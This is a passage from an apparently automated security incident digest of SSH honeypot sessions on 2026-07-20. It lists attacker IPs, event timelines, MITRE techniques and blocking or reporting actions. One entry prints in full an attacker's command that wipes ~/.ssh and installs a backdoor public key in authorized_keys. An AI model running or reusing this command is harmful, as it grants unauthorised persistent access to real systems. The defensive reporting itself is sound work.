|---|---|
| `2026-07-20 11:39:48` | `cowrie.session.connect` |
| `2026-07-20 11:39:48` | `cowrie.client.version` |
| `2026-07-20 11:39:51` | `cowrie.client.kex` |
| `2026-07-20 11:39:56` | `cowrie.login.success` |
| `2026-07-20 11:40:10` | `cowrie.session.params` |
| `2026-07-20 11:40:10` | `cowrie.command.input` |
| `2026-07-20 11:40:10` | `cowrie.log.closed` |
| `2026-07-20 11:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.96.79[.]13` to AbuseIPDB if not already reported
- [ ] Block `114.96.79[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a22ac81a834

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:40 |
| **Last Seen** | 2026-07-20 11:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:40:52` | `cowrie.session.connect` |
| `2026-07-20 11:40:52` | `cowrie.client.version` |
| `2026-07-20 11:40:53` | `cowrie.client.kex` |
| `2026-07-20 11:40:53` | `cowrie.login.success` |
| `2026-07-20 11:40:54` | `cowrie.session.params` |
| `2026-07-20 11:40:54` | `cowrie.command.input` |
| `2026-07-20 11:40:55` | `cowrie.log.closed` |
| `2026-07-20 11:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43b4cc5795c8

| Field | Detail |
|---|---|
| **Source IP** | `222.186.68[.]153` |
| **First Seen** | 2026-07-20 11:42 |
| **Last Seen** | 2026-07-20 11:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:42:26` | `cowrie.session.connect` |
| `2026-07-20 11:42:27` | `cowrie.client.version` |
| `2026-07-20 11:42:27` | `cowrie.client.kex` |
| `2026-07-20 11:42:29` | `cowrie.login.success` |
| `2026-07-20 11:42:30` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.186.68[.]153` to AbuseIPDB if not already reported
- [ ] Block `222.186.68[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7ef7acb240

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-20 11:43 |
| **Last Seen** | 2026-07-20 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:43:13` | `cowrie.session.connect` |
| `2026-07-20 11:43:13` | `cowrie.client.version` |
| `2026-07-20 11:43:13` | `cowrie.client.kex` |
| `2026-07-20 11:43:13` | `cowrie.login.success` |
| `2026-07-20 11:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ce9f5a63157

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-20 11:43 |
| **Last Seen** | 2026-07-20 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:43:13` | `cowrie.session.connect` |
| `2026-07-20 11:43:13` | `cowrie.client.version` |
| `2026-07-20 11:43:13` | `cowrie.client.kex` |
| `2026-07-20 11:43:13` | `cowrie.login.success` |
| `2026-07-20 11:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-223407bea035

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-20 11:43 |
| **Last Seen** | 2026-07-20 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:43:16` | `cowrie.session.connect` |
| `2026-07-20 11:43:16` | `cowrie.client.version` |
| `2026-07-20 11:43:17` | `cowrie.client.kex` |
| `2026-07-20 11:43:17` | `cowrie.login.success` |
| `2026-07-20 11:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f62059e0249

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-20 11:43 |
| **Last Seen** | 2026-07-20 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:43:17` | `cowrie.session.connect` |
| `2026-07-20 11:43:17` | `cowrie.client.version` |
| `2026-07-20 11:43:17` | `cowrie.client.kex` |
| `2026-07-20 11:43:17` | `cowrie.login.success` |
| `2026-07-20 11:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86e329923b2a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-20 11:43 |
| **Last Seen** | 2026-07-20 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:43:17` | `cowrie.session.connect` |
| `2026-07-20 11:43:17` | `cowrie.client.version` |
| `2026-07-20 11:43:17` | `cowrie.client.kex` |
| `2026-07-20 11:43:17` | `cowrie.login.success` |
| `2026-07-20 11:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb9e19ea7451

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-20 11:43 |
| **Last Seen** | 2026-07-20 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:43:17` | `cowrie.session.connect` |
| `2026-07-20 11:43:17` | `cowrie.client.version` |
| `2026-07-20 11:43:17` | `cowrie.client.kex` |
| `2026-07-20 11:43:18` | `cowrie.login.success` |
| `2026-07-20 11:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e105629b56a8

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-20 11:43 |
| **Last Seen** | 2026-07-20 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:43:22` | `cowrie.session.connect` |
| `2026-07-20 11:43:22` | `cowrie.client.version` |
| `2026-07-20 11:43:22` | `cowrie.client.kex` |
| `2026-07-20 11:43:23` | `cowrie.login.success` |
| `2026-07-20 11:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de56464198ad

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-20 11:43 |
| **Last Seen** | 2026-07-20 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:43:23` | `cowrie.session.connect` |
| `2026-07-20 11:43:23` | `cowrie.client.version` |
| `2026-07-20 11:43:23` | `cowrie.client.kex` |
| `2026-07-20 11:43:23` | `cowrie.login.success` |
| `2026-07-20 11:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-003433c395f5

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:43 |
| **Last Seen** | 2026-07-20 11:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:43:35` | `cowrie.session.connect` |
| `2026-07-20 11:43:35` | `cowrie.client.version` |
| `2026-07-20 11:43:35` | `cowrie.client.kex` |
| `2026-07-20 11:43:36` | `cowrie.login.success` |
| `2026-07-20 11:43:37` | `cowrie.session.params` |
| `2026-07-20 11:43:37` | `cowrie.command.input` |
| `2026-07-20 11:43:37` | `cowrie.log.closed` |
| `2026-07-20 11:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa828617e378

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-20 11:44 |
| **Last Seen** | 2026-07-20 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:44:00` | `cowrie.session.connect` |
| `2026-07-20 11:44:00` | `cowrie.client.version` |
| `2026-07-20 11:44:00` | `cowrie.client.kex` |
| `2026-07-20 11:44:01` | `cowrie.login.success` |
| `2026-07-20 11:44:02` | `cowrie.session.params` |
| `2026-07-20 11:44:02` | `cowrie.command.input` |
| `2026-07-20 11:44:02` | `cowrie.log.closed` |
| `2026-07-20 11:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b3e749d80a0

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:46 |
| **Last Seen** | 2026-07-20 11:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:46:18` | `cowrie.session.connect` |
| `2026-07-20 11:46:18` | `cowrie.client.version` |
| `2026-07-20 11:46:18` | `cowrie.client.kex` |
| `2026-07-20 11:46:19` | `cowrie.login.success` |
| `2026-07-20 11:46:20` | `cowrie.session.params` |
| `2026-07-20 11:46:20` | `cowrie.command.input` |
| `2026-07-20 11:46:20` | `cowrie.log.closed` |
| `2026-07-20 11:46:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-993d37cb6d72

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:48 |
| **Last Seen** | 2026-07-20 11:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:48:59` | `cowrie.session.connect` |
| `2026-07-20 11:48:59` | `cowrie.client.version` |
| `2026-07-20 11:49:00` | `cowrie.client.kex` |
| `2026-07-20 11:49:00` | `cowrie.login.success` |
| `2026-07-20 11:49:01` | `cowrie.session.params` |
| `2026-07-20 11:49:01` | `cowrie.command.input` |
| `2026-07-20 11:49:02` | `cowrie.log.closed` |
| `2026-07-20 11:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afe7f0227f0e

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:51 |
| **Last Seen** | 2026-07-20 11:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:51:34` | `cowrie.session.connect` |
| `2026-07-20 11:51:34` | `cowrie.client.version` |
| `2026-07-20 11:51:35` | `cowrie.client.kex` |
| `2026-07-20 11:51:35` | `cowrie.login.success` |
| `2026-07-20 11:51:36` | `cowrie.session.params` |
| `2026-07-20 11:51:36` | `cowrie.command.input` |
| `2026-07-20 11:51:37` | `cowrie.log.closed` |
| `2026-07-20 11:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32cbe74ab44f

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]55` |
| **First Seen** | 2026-07-20 11:53 |
| **Last Seen** | 2026-07-20 11:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:53:02` | `cowrie.session.connect` |
| `2026-07-20 11:53:02` | `cowrie.client.version` |
| `2026-07-20 11:53:02` | `cowrie.client.kex` |
| `2026-07-20 11:53:03` | `cowrie.login.success` |
| `2026-07-20 11:53:03` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:53:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]55` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ceef31d2c87

| Field | Detail |
|---|---|
| **Source IP** | `49.206.201[.]253` |
| **First Seen** | 2026-07-20 11:54 |
| **Last Seen** | 2026-07-20 11:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:54:54` | `cowrie.session.connect` |
| `2026-07-20 11:54:55` | `cowrie.client.version` |
| `2026-07-20 11:54:55` | `cowrie.client.kex` |
| `2026-07-20 11:54:57` | `cowrie.login.success` |
| `2026-07-20 11:54:57` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.201[.]253` to AbuseIPDB if not already reported
- [ ] Block `49.206.201[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-132012faca41

| Field | Detail |
|---|---|
| **Source IP** | `125.142.37[.]91` |
| **First Seen** | 2026-07-20 11:55 |
| **Last Seen** | 2026-07-20 11:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:55:04` | `cowrie.session.connect` |
| `2026-07-20 11:55:04` | `cowrie.client.version` |
| `2026-07-20 11:55:04` | `cowrie.client.kex` |
| `2026-07-20 11:55:05` | `cowrie.login.success` |
| `2026-07-20 11:55:06` | `cowrie.session.params` |
| `2026-07-20 11:55:06` | `cowrie.command.input` |
| `2026-07-20 11:55:06` | `cowrie.command.failed` |
| `2026-07-20 11:55:06` | `cowrie.log.closed` |
| `2026-07-20 11:55:07` | `cowrie.session.params` |
| `2026-07-20 11:55:07` | `cowrie.command.input` |
| `2026-07-20 11:55:07` | `cowrie.session.file_download` |
| `2026-07-20 11:55:07` | `cowrie.log.closed` |
| `2026-07-20 11:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.142.37[.]91` to AbuseIPDB if not already reported
- [ ] Block `125.142.37[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2713343849d8

| Field | Detail |
|---|---|
| **Source IP** | `125.142.37[.]91` |
| **First Seen** | 2026-07-20 11:55 |
| **Last Seen** | 2026-07-20 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:55:08` | `cowrie.session.connect` |
| `2026-07-20 11:55:08` | `cowrie.client.version` |
| `2026-07-20 11:55:08` | `cowrie.client.kex` |
| `2026-07-20 11:55:09` | `cowrie.login.success` |
| `2026-07-20 11:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.142.37[.]91` to AbuseIPDB if not already reported
- [ ] Block `125.142.37[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ef48ffdf55a

| Field | Detail |
|---|---|
| **Source IP** | `125.142.37[.]91` |
| **First Seen** | 2026-07-20 11:55 |
| **Last Seen** | 2026-07-20 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:55:09` | `cowrie.session.connect` |
| `2026-07-20 11:55:09` | `cowrie.client.version` |
| `2026-07-20 11:55:09` | `cowrie.client.kex` |
| `2026-07-20 11:55:10` | `cowrie.login.success` |
| `2026-07-20 11:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.142.37[.]91` to AbuseIPDB if not already reported
- [ ] Block `125.142.37[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ad6dd9c775

| Field | Detail |
|---|---|
| **Source IP** | `59.46.182[.]10` |
| **First Seen** | 2026-07-20 11:58 |
| **Last Seen** | 2026-07-20 11:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:58:21` | `cowrie.session.connect` |
| `2026-07-20 11:58:23` | `cowrie.client.version` |
| `2026-07-20 11:58:23` | `cowrie.client.kex` |
| `2026-07-20 11:58:26` | `cowrie.login.success` |
| `2026-07-20 11:58:27` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.46.182[.]10` to AbuseIPDB if not already reported
- [ ] Block `59.46.182[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e995aee6334

| Field | Detail |
|---|---|
| **Source IP** | `220.134.25[.]203` |
| **First Seen** | 2026-07-20 12:02 |
| **Last Seen** | 2026-07-20 12:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:02:30` | `cowrie.session.connect` |
| `2026-07-20 12:02:30` | `cowrie.client.version` |
| `2026-07-20 12:02:30` | `cowrie.client.kex` |
| `2026-07-20 12:02:32` | `cowrie.login.success` |
| `2026-07-20 12:02:32` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.134.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `220.134.25[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c699ed7e038

| Field | Detail |
|---|---|
| **Source IP** | `196.191.142[.]67` |
| **First Seen** | 2026-07-20 12:02 |
| **Last Seen** | 2026-07-20 12:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:02:42` | `cowrie.session.connect` |
| `2026-07-20 12:02:43` | `cowrie.client.version` |
| `2026-07-20 12:02:43` | `cowrie.client.kex` |
| `2026-07-20 12:02:44` | `cowrie.login.success` |
| `2026-07-20 12:02:45` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.191.142[.]67` to AbuseIPDB if not already reported
- [ ] Block `196.191.142[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6125b8b073da

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-20 12:05 |
| **Last Seen** | 2026-07-20 12:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:05:14` | `cowrie.session.connect` |
| `2026-07-20 12:05:14` | `cowrie.client.version` |
| `2026-07-20 12:05:14` | `cowrie.client.kex` |
| `2026-07-20 12:05:16` | `cowrie.login.success` |
| `2026-07-20 12:05:16` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c19f5eda9720

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-20 12:07 |
| **Last Seen** | 2026-07-20 12:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 12:07:25` | `cowrie.session.connect` |
| `2026-07-20 12:07:25` | `cowrie.client.version` |
| `2026-07-20 12:07:25` | `cowrie.client.kex` |
| `2026-07-20 12:07:25` | `cowrie.login.success` |
| `2026-07-20 12:07:25` | `cowrie.direct-tcpip.request` |
| `2026-07-20 12:07:26` | `cowrie.direct-tcpip.data` |
| `2026-07-20 12:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a7c61a6156

| Field | Detail |
|---|---|
| **Source IP** | `213.176.16[.]218` |
| **First Seen** | 2026-07-20 12:10 |
| **Last Seen** | 2026-07-20 12:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
